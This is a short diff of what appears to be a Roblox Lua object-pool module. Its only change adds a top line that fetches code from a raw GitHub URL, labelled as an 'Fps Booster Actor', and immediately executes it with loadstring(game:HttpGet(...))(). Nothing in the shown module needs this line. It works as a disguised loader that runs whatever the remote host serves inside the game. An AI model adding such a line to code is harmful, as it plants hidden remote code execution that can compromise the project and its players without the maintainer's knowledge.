@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AMOGUS392/Fps-Booster-Actor/refs/heads/main/Fps%20Booster%20Actor", true))()
 local ObjectPool = {}
 ObjectPool.__index = ObjectPool
 
